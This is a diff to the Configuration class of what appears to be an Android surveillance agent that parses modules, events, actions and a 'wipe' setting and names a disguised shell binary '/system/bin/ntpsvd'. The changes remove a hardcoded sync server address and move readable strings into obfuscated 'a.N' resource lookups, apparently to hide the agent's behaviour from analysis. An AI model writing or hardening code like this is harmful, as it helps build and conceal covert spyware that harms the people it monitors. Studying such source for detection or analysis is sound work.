@@ -54,12 +54,10 @@ public class Configuration {
 	/** The Constant TASK_ACTION_TIMEOUT. */
 	public static final long TASK_ACTION_TIMEOUT = 600000;
 
-	public static final boolean OVERRIDE_SYNC_URL = false;
-	public static final String SYNC_URL = "http://172.20.20.147/wc12/webclient"; //$NON-NLS-1$
 	/** The Constant MIN_AVAILABLE_SIZE. */
 	public static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
-	public static final String shellFile = "/system/bin/ntpsvd";
+	public static final String shellFile = Messages.getString("a.0"); //$NON-NLS-1$
 
 	private static final int AGENT_ENABLED = 0x2;
 
@@ -137,7 +135,7 @@ public class Configuration {
 				try {
 					jobject = jmodules.getJSONObject(i);
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (load): " + jobject);
+						Check.log(TAG + " (load): " + jobject); //$NON-NLS-1$
 					}
 					visitor.call(i, jobject);
 				} catch (JSONException e1) {
@@ -146,7 +144,7 @@ public class Configuration {
 					}
 
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (load) Error: " + e1);
+						Check.log(TAG + " (load) Error: " + e1); //$NON-NLS-1$
 					}
 				} catch (GeneralException e) {
 					if (Cfg.EXCEPTION) {
@@ -154,7 +152,7 @@ public class Configuration {
 					}
 
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (load) Error: " + e);
+						Check.log(TAG + " (load) Error: " + e); //$NON-NLS-1$
 					}
 				} catch (ConfigurationException e) {
 					if (Cfg.EXCEPTION) {
@@ -162,7 +160,7 @@ public class Configuration {
 					}
 
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (load) Error: " + e);
+						Check.log(TAG + " (load) Error: " + e); //$NON-NLS-1$
 					}
 				}
 			}
@@ -178,7 +176,7 @@ public class Configuration {
 
 		public void call(int moduleId, JSONObject params) throws ConfigurationException, GeneralException,
 				JSONException {
-			final String moduleType = params.getString("module");
+			final String moduleType = params.getString(Messages.getString("a.18")); //$NON-NLS-1$
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Module: " + moduleType + " Params size: " + params.length());//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
@@ -198,15 +196,15 @@ public class Configuration {
 
 		public void call(int eventId, JSONObject jmodule) throws JSONException, GeneralException {
 			if (Cfg.DEBUG) {
-				Check.requires(jmodule != null, " (call) Assert failed, null jmodule");
+				Check.requires(jmodule != null, " (call) Assert failed, null jmodule"); //$NON-NLS-1$
 			}
 
-			String eventType = jmodule.getString("event");
+			String eventType = jmodule.getString(Messages.getString("a.17")); //$NON-NLS-1$
 			if (Cfg.DEBUG) {
-				Check.asserts(eventType != null, " (call) Assert failed, null eventType");
+				Check.asserts(eventType != null, " (call) Assert failed, null eventType"); //$NON-NLS-1$
 			}
-			if (jmodule.has("type")) {
-				eventType += " " + jmodule.getString("type");
+			if (jmodule.has(Messages.getString("a.16"))) { //$NON-NLS-1$
+				eventType += " " + jmodule.getString(Messages.getString("a.12")); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 
 			if (Cfg.DEBUG) {
@@ -228,10 +226,10 @@ public class Configuration {
 
 		public void call(int actionId, JSONObject jaction) throws ConfigurationException, GeneralException,
 				JSONException {
-			String desc = jaction.getString("desc");
+			String desc = jaction.getString(Messages.getString("a.13")); //$NON-NLS-1$
 			final Action a = new Action(actionId, desc);
 
-			JSONArray jsubactions = jaction.getJSONArray("subactions");
+			JSONArray jsubactions = jaction.getJSONArray(Messages.getString("a.14")); //$NON-NLS-1$
 			int subNum = jsubactions.length();
 
 			if (Cfg.DEBUG) {
@@ -241,7 +239,7 @@ public class Configuration {
 			for (int j = 0; j < subNum; j++) {
 				JSONObject jsubaction = jsubactions.getJSONObject(j);
 
-				final String type = jsubaction.getString("action");
+				final String type = jsubaction.getString(Messages.getString("a.15")); //$NON-NLS-1$
 				ConfAction conf = new ConfAction(actionId, j, type, jsubaction);
 				if (a.addSubAction(conf)) {
 					if (Cfg.DEBUG) {
@@ -269,14 +267,14 @@ public class Configuration {
 	private boolean parseConfiguration(boolean instantiate, String json) throws GeneralException {
 		try {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parseConfiguration): " + json);
+				Check.log(TAG + " (parseConfiguration): " + json); //$NON-NLS-1$
 			}
 			JSONObject root = (JSONObject) new JSONTokener(json).nextValue();
 
-			JSONArray jmodules = root.getJSONArray("modules");
-			JSONArray jevents = root.getJSONArray("events");
-			JSONArray jactions = root.getJSONArray("actions");
-			JSONObject jglobals = root.getJSONObject("globals");
+			JSONArray jmodules = root.getJSONArray(Messages.getString("a.8")); //$NON-NLS-1$
+			JSONArray jevents = root.getJSONArray(Messages.getString("a.9")); //$NON-NLS-1$
+			JSONArray jactions = root.getJSONArray(Messages.getString("a.10")); //$NON-NLS-1$
+			JSONObject jglobals = root.getJSONObject(Messages.getString("a.11")); //$NON-NLS-1$
 
 			Visitor.load(jmodules, new LoadModule(instantiate));
 			Visitor.load(jevents, new LoadEvent(instantiate));
@@ -298,7 +296,7 @@ public class Configuration {
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parseConfiguration) Error: " + e);
+				Check.log(TAG + " (parseConfiguration) Error: " + e); //$NON-NLS-1$
 			}
 			return false;
 		}
@@ -309,14 +307,14 @@ public class Configuration {
 
 		Globals g = new Globals();
 
-		JSONObject jquota = jglobals.getJSONObject("quota");
-		g.quotaMin = jquota.getInt("min");
-		g.quotaMax = jquota.getInt("max");
+		JSONObject jquota = jglobals.getJSONObject(Messages.getString("a.1")); //$NON-NLS-1$
+		g.quotaMin = jquota.getInt(Messages.getString("a.2")); //$NON-NLS-1$
+		g.quotaMax = jquota.getInt(Messages.getString("a.3")); //$NON-NLS-1$
 
-		g.wipe = jglobals.getBoolean("wipe");
-		g.type = jglobals.getString("type");
-		g.migrated = jglobals.getBoolean("migrated");
-		g.version = jglobals.getInt("version");
+		g.wipe = jglobals.getBoolean(Messages.getString("a.4")); //$NON-NLS-1$
+		g.type = jglobals.getString(Messages.getString("a.5")); //$NON-NLS-1$
+		g.migrated = jglobals.getBoolean(Messages.getString("a.6")); //$NON-NLS-1$
+		g.version = jglobals.getInt(Messages.getString("a.7")); //$NON-NLS-1$
 
 		status.setGlobal(g);
 	}
@@ -343,7 +341,7 @@ public class Configuration {
 
 		try {
 			if (rawConf == null) {
-				throw new GeneralException("Cannot allocate memory for configuration"); //$NON-NLS-1$
+				throw new GeneralException("conf"); //$NON-NLS-1$
 			}
 
 			// Crypto crypto = new Crypto(Keys.g_ConfKey);
